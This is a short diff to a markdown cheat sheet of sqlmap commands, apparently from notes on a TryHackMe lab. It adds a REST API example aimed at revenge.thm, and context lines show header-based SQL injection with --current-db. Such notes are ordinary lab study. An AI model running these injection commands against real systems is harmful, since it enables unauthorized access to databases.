@@ -85,3 +85,8 @@ sqlmap –dbms mysql --headers="X-forwarded-for:1*" -u http://<ip>
 ```sh
 --random-agent --current-db
 ```
+
+```sh
+# REST API の例
+sqlmap -u "http://revenge.thm/products/1*" --batch
+```
